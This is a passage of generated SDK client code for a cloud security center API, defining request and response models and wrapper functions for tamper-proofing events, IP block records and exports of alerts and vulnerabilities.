      instanceName?: string(name='InstanceName', description='The name of the asset.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the affected asset.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='172.25.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the asset.', example='8.210.XX.XX'),
      level?: string(name='Level', description='The severity of the event on web tamper proofing. Valid values: **medium**.', example='medium'),
      path?: string(name='Path', description='The file path.', example='D:\\test-tamper-proofing\\123.html'),
      processName?: string(name='ProcessName', description='The name of the process.', example='python3.7'),
      processPath?: string(name='ProcessPath', description='The path of the process.', example='C:\\Windows\\explorer.exe'),
      status?: string(name='Status', description='The status of the event on web tamper proofing. Valid values:

*   **1**: unhandled
*   **2**: ignored
*   **4**: deprecated
*   **8**: marked as false positive
*   **10**: added to the whitelist
*   **16**: being handled
*   **32**: defended
*   **64**: invalid
*   **128**: deleted
*   **512**: automatically handled', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='An array that consists of events on web tamper proofing returned.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  totalCount?: int32(name='TotalCount', description='The total number of events on web tamper proofing returned.', example='100'),
}

model DescribeWebLockFileEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileEventsResponseBody(name='body'),
}

async function describeWebLockFileEventsWithOptions(request: DescribeWebLockFileEventsRequest, runtime: Util.RuntimeOptions): DescribeWebLockFileEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.processName)) {
    query['ProcessName'] = request.processName;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.tsBegin)) {
    query['TsBegin'] = request.tsBegin;
  }
  if (!Util.isUnset(request.tsEnd)) {
    query['TsEnd'] = request.tsEnd;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockFileEvents(request: DescribeWebLockFileEventsRequest): DescribeWebLockFileEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileEventsWithOptions(request, runtime);
}

model DescribeWebLockFileTypeSummaryResponseBody = {
  list?: [ 
    {
      count?: int32(name='Count', example='3'),
      type?: string(name='Type', example='jsp'),
    }
  ](name='List'),
  requestId?: string(name='RequestId', example='4BB99533-4FDC-5B9C-A5E4-5AE3E9BE5C78'),
  totalCount?: int32(name='TotalCount', example='639'),
}

model DescribeWebLockFileTypeSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileTypeSummaryResponseBody(name='body'),
}

async function describeWebLockFileTypeSummaryWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockFileTypeSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileTypeSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockFileTypeSummary(): DescribeWebLockFileTypeSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileTypeSummaryWithOptions(runtime);
}

model DescribeWebLockInclusiveFileTypeResponseBody = {
  inclusiveFileType?: [ string ](name='InclusiveFileType'),
  requestId?: string(name='RequestId', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  totalCount?: int32(name='TotalCount', example='15'),
}

model DescribeWebLockInclusiveFileTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockInclusiveFileTypeResponseBody(name='body'),
}

async function describeWebLockInclusiveFileTypeWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockInclusiveFileTypeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockInclusiveFileType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockInclusiveFileType(): DescribeWebLockInclusiveFileTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockInclusiveFileTypeWithOptions(runtime);
}

model DescribeWebLockProcessBlockStatisticsRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribeWebLockProcessBlockStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', example='1'),
  list?: [ 
    {
      count?: int32(name='Count', example='20'),
      process?: string(name='Process', example='cron'),
    }
  ](name='List'),
  pageSize?: int32(name='PageSize', example='20'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  totalCount?: int32(name='TotalCount', example='100'),
}

model DescribeWebLockProcessBlockStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockProcessBlockStatisticsResponseBody(name='body'),
}

async function describeWebLockProcessBlockStatisticsWithOptions(request: DescribeWebLockProcessBlockStatisticsRequest, runtime: Util.RuntimeOptions): DescribeWebLockProcessBlockStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockProcessBlockStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockProcessBlockStatistics(request: DescribeWebLockProcessBlockStatisticsRequest): DescribeWebLockProcessBlockStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockProcessBlockStatisticsWithOptions(request, runtime);
}

model DescribeWebLockProcessListRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  processName?: string(name='ProcessName'),
  status?: int32(name='Status'),
}

model DescribeWebLockProcessListResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  list?: [ 
    {
      count?: string(name='Count'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      processName?: string(name='ProcessName'),
      processPath?: string(name='ProcessPath'),
      status?: int32(name='Status'),
      uuid?: string(name='Uuid'),
    }
  ](name='List'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockProcessListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockProcessListResponseBody(name='body'),
}

async function describeWebLockProcessListWithOptions(request: DescribeWebLockProcessListRequest, runtime: Util.RuntimeOptions): DescribeWebLockProcessListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.processName)) {
    query['ProcessName'] = request.processName;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockProcessList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockProcessList(request: DescribeWebLockProcessListRequest): DescribeWebLockProcessListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockProcessListWithOptions(request, runtime);
}

model DescribeWebLockStatusRequest {
  from?: string(name='From', example='sas'),
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='221.214.XXX.XX'),
}

model DescribeWebLockStatusResponseBody = {
  authCount?: int32(name='AuthCount', example='32'),
  bindCount?: int32(name='BindCount', example='2'),
  blockCount?: int32(name='BlockCount', example='48'),
  dirCount?: int32(name='DirCount', example='2'),
  expireTime?: long(name='ExpireTime', example='1688090851000'),
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  whiteCount?: int32(name='WhiteCount', example='6'),
}

model DescribeWebLockStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockStatusResponseBody(name='body'),
}

async function describeWebLockStatusWithOptions(request: DescribeWebLockStatusRequest, runtime: Util.RuntimeOptions): DescribeWebLockStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockStatus(request: DescribeWebLockStatusRequest): DescribeWebLockStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockStatusWithOptions(request, runtime);
}

model DescribeWebLockTotalFileChangeCountResponseBody = {
  requestId?: string(name='RequestId'),
  totalCount?: long(name='TotalCount'),
}

model DescribeWebLockTotalFileChangeCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockTotalFileChangeCountResponseBody(name='body'),
}

async function describeWebLockTotalFileChangeCountWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockTotalFileChangeCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockTotalFileChangeCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockTotalFileChangeCount(): DescribeWebLockTotalFileChangeCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockTotalFileChangeCountWithOptions(runtime);
}

model DescribeWebPathRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  type?: string(name='Type'),
}

model DescribeWebPathResponseBody = {
  configList?: [ 
    {
      targetList?: [ 
        {
          target?: string(name='Target'),
          targetType?: string(name='TargetType'),
        }
      ](name='TargetList'),
      webPath?: string(name='WebPath'),
      webPathType?: string(name='WebPathType'),
    }
  ](name='ConfigList'),
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebPathResponseBody(name='body'),
}

async function describeWebPathWithOptions(request: DescribeWebPathRequest, runtime: Util.RuntimeOptions): DescribeWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebPath(request: DescribeWebPathRequest): DescribeWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebPathWithOptions(request, runtime);
}

model DisableBruteForceRecordRequest {
  blockIp?: string(name='BlockIp', example='8.210.XX.XX'),
  bound?: string(name='Bound', example='in'),
  id?: long(name='Id', example='114166XX'),
  port?: string(name='Port', example='*/*'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuid?: string(name='Uuid', example='cbb9aa80-a8d1-443c-9ff0-2c36cd39****'),
}

model DisableBruteForceRecordResponseBody = {
  requestId?: string(name='RequestId', example='5EFF53F7-9B2A-58B5-AD06-6B07ACE17133'),
}

model DisableBruteForceRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DisableBruteForceRecordResponseBody(name='body'),
}

async function disableBruteForceRecordWithOptions(request: DisableBruteForceRecordRequest, runtime: Util.RuntimeOptions): DisableBruteForceRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DisableBruteForceRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function disableBruteForceRecord(request: DisableBruteForceRecordRequest): DisableBruteForceRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return disableBruteForceRecordWithOptions(request, runtime);
}

model DisableCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', example='62.233.XX.XX'),
  bound?: string(name='Bound', example='in'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DisableCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', example='F749D54C-3CA0-5F68-835C-AD35A2BD29EA'),
}

model DisableCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DisableCustomBlockRecordResponseBody(name='body'),
}

async function disableCustomBlockRecordWithOptions(request: DisableCustomBlockRecordRequest, runtime: Util.RuntimeOptions): DisableCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DisableCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function disableCustomBlockRecord(request: DisableCustomBlockRecordRequest): DisableCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return disableCustomBlockRecordWithOptions(request, runtime);
}

model EnableBruteForceRecordRequest {
  blockIp?: string(name='BlockIp', example='61.155.XX.XX'),
  bound?: string(name='Bound', example='in'),
  id?: long(name='Id', example='116602XX'),
  port?: string(name='Port', example='22/22'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuid?: string(name='Uuid', example='71046acb-8bff-4c3b-9163-24deb007****'),
}

model EnableBruteForceRecordResponseBody = {
  requestId?: string(name='RequestId', example='DFAECA37-4660-5EB6-9A18-8FDF56B3****'),
}

model EnableBruteForceRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: EnableBruteForceRecordResponseBody(name='body'),
}

async function enableBruteForceRecordWithOptions(request: EnableBruteForceRecordRequest, runtime: Util.RuntimeOptions): EnableBruteForceRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'EnableBruteForceRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function enableBruteForceRecord(request: EnableBruteForceRecordRequest): EnableBruteForceRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return enableBruteForceRecordWithOptions(request, runtime);
}

model EnableCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp'),
  bound?: string(name='Bound'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model EnableCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId'),
}

model EnableCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: EnableCustomBlockRecordResponseBody(name='body'),
}

async function enableCustomBlockRecordWithOptions(request: EnableCustomBlockRecordRequest, runtime: Util.RuntimeOptions): EnableCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'EnableCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function enableCustomBlockRecord(request: EnableCustomBlockRecordRequest): EnableCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return enableCustomBlockRecordWithOptions(request, runtime);
}

model ExecStrategyRequest {
  lang?: string(name='Lang', example='zh'),
  strategyId?: int32(name='StrategyId', example='215421'),
}

model ExecStrategyResponseBody = {
  requestId?: string(name='RequestId', example='7F84EBCA-86F8-5AA0-BF74-A0276ECB****'),
}

model ExecStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExecStrategyResponseBody(name='body'),
}

async function execStrategyWithOptions(request: ExecStrategyRequest, runtime: Util.RuntimeOptions): ExecStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExecStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function execStrategy(request: ExecStrategyRequest): ExecStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return execStrategyWithOptions(request, runtime);
}

model ExportRecordRequest {
  exportType?: string(name='ExportType', description='The type of the check result list to export. Valid values:

*   **assetInstance**: the list of servers displayed on the Host page
*   **user**: the list of fingerprints for accounts
*   **port**: the list of fingerprints for ports
*   **process**: the list of fingerprints for processes
*   **sca**: the list of fingerprints for middleware assets
*   **database**: the list of fingerprints for databases
*   **web**: the list of fingerprints for web services
*   **software**: the list of fingerprints for software assets
*   **cron**: the list of fingerprints for scheduled tasks
*   **autorun**: the list of fingerprints for startup items
*   **lkm**: the list of fingerprints for kernel modules
*   **webserver**: the list of fingerprints for websites
*   **imageVulExport**: the list of image system vulnerabilities
*   **imageBaseLineExport**: the list of baseline check results for images
*   **imageAffectedMaliciousExport**: the list of check results for malicious image samples
*   **baseline**: the list of check results for configuration assessment
*   **attack**: the list of alerts for attack analysis
*   **accessKey**: the list of alerts that are generated for AccessKey pair leaks', example='database'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  params?: string(name='Params', description='The conditions that are used to filter check results.

>  This operation is a common export operation for multiple features of Security Center. The available configuration fields of this parameter vary based on the features. We recommend that you do not specify this parameter when you call the operation. You can export an information list without specifying this parameter, and then filter data in the exported Excel file.', example='{"extend":"1","currentPage":1,"pageSize":10}'),
}

model ExportRecordResponseBody = {
  fileName?: string(name='FileName', description='The name of the exported file.', example='cms_20171101.xlsx'),
  id?: long(name='Id', description='The ID of the exported file.', example='131231'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model ExportRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportRecordResponseBody(name='body'),
}

/**
  * You can call the operation to export the following check result lists:
  * *   The list of servers on the Host page.
  * *   The lists of image system vulnerabilities, image application vulnerabilities, image baseline check results, and malicious image samples on the Image Security page.
  * *   The list of attack analysis data on the Attack Awareness page.
  * *   The list of check results for AccessKey pair leaks on the AccessKey Leak page.
  *
  * @param request ExportRecordRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ExportRecordResponse
 */
async function exportRecordWithOptions(request: ExportRecordRequest, runtime: Util.RuntimeOptions): ExportRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.params)) {
    query['Params'] = request.params;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can call the operation to export the following check result lists:
  * *   The list of servers on the Host page.
  * *   The lists of image system vulnerabilities, image application vulnerabilities, image baseline check results, and malicious image samples on the Image Security page.
  * *   The list of attack analysis data on the Attack Awareness page.
  * *   The list of check results for AccessKey pair leaks on the AccessKey Leak page.
  *
  * @param request ExportRecordRequest
  * @return ExportRecordResponse
 */
async function exportRecord(request: ExportRecordRequest): ExportRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportRecordWithOptions(request, runtime);
}

model ExportSuspEventsRequest {
  assetsTypeList?: [ string ](name='AssetsTypeList'),
  clusterId?: string(name='ClusterId', example='c4af4fdf38a98496a9b63c2be5dae****'),
  containerFieldName?: string(name='ContainerFieldName', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', example='c819391d2d520485fa3e81e2dc2ea****'),
  currentPage?: string(name='CurrentPage', example='1'),
  dealed?: string(name='Dealed', example='Y'),
  from?: string(name='From', example='sas'),
  lang?: string(name='Lang', example='zh'),
  levels?: string(name='Levels', example='serious,suspicious,remind'),
  name?: string(name='Name', example='WEBSHELL'),
  pageSize?: string(name='PageSize', example='20'),
  parentEventTypes?: string(name='ParentEventTypes', example='WEBSHELL'),
  remark?: string(name='Remark', example='remark'),
  sourceIp?: string(name='SourceIp', example='127.0.0.1'),
  status?: string(name='Status', example='0'),
  targetType?: string(name='TargetType', example='uuid'),
  timeEnd?: string(name='TimeEnd', example='2022-12-05 00:00:00'),
  timeStart?: string(name='TimeStart', example='2022-10-01 00:00:00'),
}

model ExportSuspEventsResponseBody = {
  fileName?: string(name='FileName', example='suspicious_event_20221209'),
  id?: int32(name='Id', example='1'),
  requestId?: string(name='RequestId', example='EF145C20-6A19-529A-8BDD-0671DXXXXXX'),
}

model ExportSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportSuspEventsResponseBody(name='body'),
}

async function exportSuspEventsWithOptions(request: ExportSuspEventsRequest, runtime: Util.RuntimeOptions): ExportSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetsTypeList)) {
    query['AssetsTypeList'] = request.assetsTypeList;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.parentEventTypes)) {
    query['ParentEventTypes'] = request.parentEventTypes;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function exportSuspEvents(request: ExportSuspEventsRequest): ExportSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportSuspEventsWithOptions(request, runtime);
}

model ExportVulRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2019:3197-Important: sudo security update'),
  attachTypes?: string(name='AttachTypes', description='The additional type of the vulnerabilities. You can specify this parameter when you query application vulnerabilities. If you set Type to app, you must specify this parameter. If you set Type to a different value, this parameter is invalid. Set the value to **sca**.

>  If this parameter is set to **sca**, application vulnerabilities and the vulnerabilities that are detected based on software component analysis are queried. If you do not specify this parameter, only application vulnerabilities are queried.', example='sca'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerabilities are fixed. Valid values:

*   **y**: yes
*   **n**: no', example='n'),
  groupId?: string(name='GroupId', description='The server group ID of the server on which the vulnerabilities are detected.

>  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='8834224'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   zh: Chinese
*   en: English', example='zh'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerabilities. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap'),
  searchTags?: string(name='SearchTags', description='The tag that is used to search for the vulnerabilities. Valid values:

*   Restart required
*   Remote exploitation
*   Exploit exists
*   Exploitable
*   Privilege escalation
*   Code execution', example='Restart required'),
  type?: string(name='Type', description='The type of the vulnerabilities that you want to export. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability', example='app'),
